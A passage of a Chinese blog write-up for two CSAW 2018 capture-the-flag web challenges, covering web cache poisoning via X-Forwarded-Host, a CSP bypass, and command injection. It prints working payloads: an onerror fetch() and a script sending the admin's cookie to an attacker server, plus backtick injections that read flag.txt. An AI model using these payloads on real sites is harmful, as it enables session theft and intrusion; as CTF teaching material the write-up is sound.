+<p>&emsp;&emsp;<a href="https://portswigger.net/blog/practical-web-cache-poisoning" target="_blank">英文原版</a></p>
+<p>&emsp;&emsp;这里我们可以重点关注<code>DOM Poisoning</code>（DOM污染）。</p>
+<p>&emsp;&emsp;另一个需要先了解的事情是<code>X-Forwarded-Host</code>的作用，详情可参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Forwarded-Host" target="_blank">这里</a>。</p>
+<blockquote>
+<p>X-Forwarded-Host (XFH) 是一个事实上的标准首部，用来确定客户端发起的请求中使用  Host  指定的初始域名。<br>反向代理（如负载均衡服务器、CDN等）的域名或端口号可能会与处理请求的源头服务器有所不同，在这种情况下，X-Forwarded-Host 可以用来确定哪一个域名是最初被用来访问的。</p>
+</blockquote>
+<p>&emsp;&emsp;语法：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-Host: &lt;host&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;上面这些归结起来就是<code>当服务器进行缓存时它会将客户端的请求转发到XFH指定的host上去。</code></p>
+<p>&emsp;&emsp;现在再回过头看看我们已有的资料。我们得知<code>main.mst</code>是模板文件，它会利用<code></code>等对admin身份进行判断，如果我们能够劫持掉这个模板文件，使她绕过admin就可以获得到完整的项。</p>
+<p>&emsp;&emsp;我们先来找到<code>main.mst</code>缓存的最大时间(<code>max-age</code>)，我们可以带着<code>X-Forwarded-Host</code>不停的请求<code>/cdn/app.js</code>，如果<code>fetch(&#39;//4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/main.mst&#39;)</code>能被我们控制到<code>fetch(&#39;my_server/cdn/main.mst&#39;)</code>上就成功的完成了劫持。</p>
+<p>&emsp;&emsp;我们可以使用下面的脚本验证一下：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">X_Forwarded_Host = <span class="hljs-string">'1.2.3.4'</span> </span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:</span><br><span class="line">    resp = requests.get(<span class="hljs-string">"http://4ca7ee46a1d73057a0e009e5ce94291030185d14.hm.vulnerable.services/cdn/app.js"</span>, headers=&#123;<span class="hljs-string">'X-Forwarded-Host'</span>: X_Forwarded_Host&#125;)</span><br><span class="line">    <span class="hljs-keyword">print</span> resp.headers</span><br><span class="line">    <span class="hljs-keyword">if</span> X_Forwarded_Host <span class="hljs-keyword">in</span> resp.text:</span><br><span class="line">        <span class="hljs-keyword">print</span> resp.text</span><br><span class="line">        <span class="hljs-keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;结果如下：</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/21.png"><br></div></p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/22.png"><br></div><br>&emsp;&emsp;可以看到我们成功的通过<code>web缓存污染</code>劫持了模板文件。接着我们再构造好模板文件，然后让admin去访问就可以拿到flag了。<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header"</span>&gt;</span></span><br><span class="line">Hacker Movie Club</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"header admin"</span>&gt;</span></span><br><span class="line">Welcome to the desert of the real.</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"movies"</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span></span><br><span class="line"> <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Year<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>Length<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="line">&#123;&#123;#movies&#125;&#125;</span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; year &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>&#123;&#123; length &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">&#123;&#123;/movies&#125;&#125;</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"captcha"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"captcha"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"report"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"report"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">"fetch('http://my_server_ip/'+'&#123;&#123;#movies&#125;&#125;&#123;&#123; name &#125;&#125;&#123;&#123;/movies&#125;&#125;')"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;如果你直接访问会出现一个<code>跨域资源共享</code>（CORS）的问题，如下：</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/23.png"><br></div><br>&emsp;&emsp;它要求服务器回应的头信息要包含<code>Access-Control-Allow-Origin</code>字段，如果你不想配置Apache或者Nginx，那你可以使用下面这个建议的python web server。<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    <span class="hljs-comment"># Python 3</span></span><br><span class="line">    <span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> HTTPServer, SimpleHTTPRequestHandler, test <span class="hljs-keyword">as</span> test_orig</span><br><span class="line">    <span class="hljs-keyword">import</span> sys</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span> <span class="hljs-params">(*args)</span>:</span></span><br><span class="line">        test_orig(*args, port=int(sys.argv[<span class="hljs-number">1</span>]) <span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">8000</span>)</span><br><span class="line"><span class="hljs-keyword">except</span> ImportError: <span class="hljs-comment"># Python 2</span></span><br><span class="line">    <span class="hljs-keyword">from</span> BaseHTTPServer <span class="hljs-keyword">import</span> HTTPServer, test</span><br><span class="line">    <span class="hljs-keyword">from</span> SimpleHTTPServer <span class="hljs-keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CORSRequestHandler</span> <span class="hljs-params">(SimpleHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">end_headers</span> <span class="hljs-params">(self)</span>:</span></span><br><span class="line">        self.send_header(<span class="hljs-string">'Access-Control-Allow-Origin'</span>, <span class="hljs-string">'*'</span>)</span><br><span class="line">        SimpleHTTPRequestHandler.end_headers(self)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    test(CORSRequestHandler, HTTPServer)</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;开启后就能在日志输出中得到flag：</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/24.png"><br></div><br>&emsp;&emsp;flag：flag{I_h0pe_you_w4tch3d_a11_th3_m0v1es}</p>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p>&emsp;&emsp;<a href="https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/" target="_blank" rel="noopener">https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/</a></p>
+<h3 id="No-Vulnerable-Services"><a href="#No-Vulnerable-Services" class="headerlink" title="No Vulnerable Services"></a>No Vulnerable Services</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">No Vulnerable Services is a company founded on the idea that all websites should be secure. We use the latest web security standards, and provide complementary pentests of all customer sites with our exclusive NoPwn® guarantee.</span><br><span class="line"></span><br><span class="line">Be #unhackable.™</span><br><span class="line"></span><br><span class="line">http://no.vulnerable.services/</span><br></pre></td></tr></table></figure>
+<p><div align="center"><br>    <img src="/images/posts/csaw/25.png"><br></div><br>&emsp;&emsp;参考writeup：<a href="https://ctftime.org/writeup/11205" target="_blank">https://ctftime.org/writeup/11205</a></p>
+<p>&emsp;&emsp;进入网站可以发现使用CSP，策略如下：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;none&apos;; script-src *.no.vulnerable.services https://www.google.com/ https://www.gstatic.com/; style-src *.no.vulnerable.services https://fonts.googleapis.com/ &apos;unsafe-inline&apos;; img-src *.no.vulnerable.services; font-src *.no.vulnerable.services https://fonts.gstatic.com/; frame-src https://www.google.com/</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;可以使用Google的<a href="https://csp-evaluator.withgoogle.com/" target="_blank">CSP检测工具</a>检测一下：</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/26.png"><br></div><br>&emsp;&emsp;发现<code>script-src</code>可能存在问题，但题目环境中我们并没有能够控制<code>src</code>的地方，所以再回头看看还有什么发现。</p>
+<p>&emsp;&emsp;页面的最底下发现了一个奇怪的域名</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/27.png"><br></div><br>&emsp;&emsp;访问后发现跟主域名(<a href="http://no.vulnerable.services/index.php)页面一样。我们ping一下`no.vulnerable.services`发现解析地址是：`216.165.2.40`，而他的16进制表示就是`0xd8a50228`。如果不知道怎么转换可以使用" target="_blank" rel="noopener">http://no.vulnerable.services/index.php)页面一样。我们ping一下`no.vulnerable.services`发现解析地址是：`216.165.2.40`，而他的16进制表示就是`0xd8a50228`。如果不知道怎么转换可以使用</a><a href="https://www.browserling.com/tools/ip-to-hex" target="_blank">这个工具</a>。</p>
+<p>&emsp;&emsp;我们尝试改成对我们服务器的代理，如http://{hexip}.ip.no.vulnerable.services。</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/28.png"><br></div><br>&emsp;&emsp;可以看到代理成功，能够访问到我们的网站。</p>
+<p>&emsp;&emsp;由于CSP中存在<code>script-src *.no.vulnerable.services</code>，所以现在我们能绕过CSP保护了。</p>
+<p>&emsp;&emsp;另外还有一个点就是我们能提交网站内容供他们检查，他们会使用bot去模拟访问。</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/29.png"><br></div><br>&emsp;&emsp;所以我们在这里填写我们服务器上的恶意脚本，以拿到admin的cookie。使用脚本如下：<br><figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> img = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"img"</span>);</span><br><span class="line">img.src = <span class="hljs-string">"http://&#123;hexip&#125;.ip.no.vulnerable.services/?cookie="</span> + <span class="hljs-built_in">encodeURI</span>(<span class="hljs-built_in">document</span>.cookie);</span><br><span class="line"><span class="hljs-built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;将此脚本放到服务器上，然后在report上提交链接：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;//&#123;hexip&#125;.ip.no.vulnerable.services/your.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;为了方便，我这里使用了一个python的简易服务器：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="hljs-comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">try</span>:</span><br><span class="line">    <span class="hljs-comment"># Python 3</span></span><br><span class="line">    <span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> HTTPServer, SimpleHTTPRequestHandler, test <span class="hljs-keyword">as</span> test_orig</span><br><span class="line">    <span class="hljs-keyword">import</span> sys</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span> <span class="hljs-params">(*args)</span>:</span></span><br><span class="line">        test_orig(*args, port=int(sys.argv[<span class="hljs-number">1</span>]) <span class="hljs-keyword">if</span> len(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">8000</span>)</span><br><span class="line"><span class="hljs-keyword">except</span> ImportError: <span class="hljs-comment"># Python 2</span></span><br><span class="line">    <span class="hljs-keyword">from</span> BaseHTTPServer <span class="hljs-keyword">import</span> HTTPServer, test</span><br><span class="line">    <span class="hljs-keyword">from</span> SimpleHTTPServer <span class="hljs-keyword">import</span> SimpleHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyHandler</span><span class="hljs-params">(SimpleHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_GET</span><span class="hljs-params">(self)</span>:</span></span><br><span class="line">        print(self.headers)</span><br><span class="line">        SimpleHTTPRequestHandler.do_GET(self)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:</span><br><span class="line">    test(MyHandler, HTTPServer)</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;最后我们能收到cookie跟referer。</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/30.png"><br></div><br>&emsp;&emsp;我带着这里得到的cookie访问<code>http://admin.no.vulnerable.services</code>。可以得到一个页面，源码如下：<br><figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>NVS INTERNAL - Admin<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Current Visitors: 672<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Quick links:<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"//support.no.vulnerable.services"</span>&gt;</span>Support<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"lb.php"</span>&gt;</span>Load Balancers - BETA<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="line">        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;其中<code>lb.php</code>是一个负载均衡的监视器：</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/31.png"><br></div><br>&emsp;&emsp;而<code>support.no.vulnerable.services</code>我们无法访问，如果直接访问<code>http://216.165.2.41/</code>会得到404 Not Found。</p>
+<p>&emsp;&emsp;从<code>lb.php</code>里我们能得知<code>216.165.2.41</code>是代理服务器，所以我们在请求<code>216.165.2.41</code>的时候带上<code>Host</code>头试试。</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/32.png"><br></div><br>&emsp;&emsp;有回显，但明显被拦截了，那我们再试试另一种访问方式，ping出它的ip，然后用<code>{hexip}.ip.no.vulnerable.services</code>的方式访问。</p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/33.png"><br></div><br>&emsp;&emsp;成功进入，有一个ping的命令执行，所以考虑命令注入。</p>
+<p>&emsp;&emsp;payload1:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1`ls`</span><br></pre></td></tr></table></figure></p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/34.png"><br></div><br>&emsp;&emsp;payload2:<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1`cat%20flag.txt`</span><br></pre></td></tr></table></figure></p>
+<p><div align="center"><br>    <img src="/images/posts/csaw/35.png"><br></div><br>&emsp;&emsp;flag: flag{7672f158167cab32aebc161abe0fbfcaee2868c1}。<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/CTF/">CTF</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2018/09/cte-writeup/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">【BlockChain】 调用智能合约的方法</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2018/09/csaw-writeup/">
+                <span class="level-item">CSAW 2018 writeup</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+</div>
+                
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered">
+                <div>
+                    <img class="image is-128x128 has-mb-6" src="/images/avatar.png" alt="Junay">
+                    
+                    <p class="is-size-4 is-block">
+                        Junay
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        Junay&#39;s blog
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Shanghai</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        56
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        2
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        18
+                    </p>
+                </div>
+            </div>
+        </nav>
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/delcoding">
+                关注我</a>
+        </div>
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/delcoding">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Facebook" href="http://facebook.com">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="http://twitter.com">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Dribbble" href="http://dribbble.com">
+                
+                <i class="fab fa-dribbble"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        
+    
+        
+
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/CTF/">
+            <span class="level-start">
+                <span class="level-item">CTF</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">7</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/jekyll-update/">
+            <span class="level-start">
+                <span class="level-item">jekyll update</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">27</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/BlockChain/" style="font-size: 10px;">BlockChain</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/CVE/" style="font-size: 16.67px;">CVE</a> <a href="/tags/Hack/" style="font-size: 10px;">Hack</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/bypass-pie/" style="font-size: 10px;">bypass pie</a> <a href="/tags/kali/" style="font-size: 13.33px;">kali</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/office/" style="font-size: 16.67px;">office</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/web3/" style="font-size: 10px;">web3</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/xammpp/" style="font-size: 10px;">xammpp</a> <a href="/tags/xdebug/" style="font-size: 10px;">xdebug</a> <a href="/tags/爬虫绕过/" style="font-size: 10px;">爬虫绕过</a> <a href="/tags/百度云/" style="font-size: 10px;">百度云</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a>
+    </div>
+</div>
+
+    
+    
+        <div class="card card-transparent is-hidden-widescreen">
+        
+            
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2018/11/pie-bypass-overwrite-dup2/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="bypass pie use partial overwrite and dup2">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time></div>
+                    <a href="/2018/11/pie-bypass-overwrite-dup2/" class="has-link-black-ter is-size-6">bypass pie use partial overwrite and dup2</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/got-plt-study/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="got/plt表学习">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-21T14:47:56.000Z">2018-11-21</time></div>
+                    <a href="/2018/11/got-plt-study/" class="has-link-black-ter is-size-6">got/plt表学习</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/11/seccon2018-web-writeup/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="SECCON 2018 GhostKingdom writeup">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-11-01T03:47:56.000Z">2018-11-01</time></div>
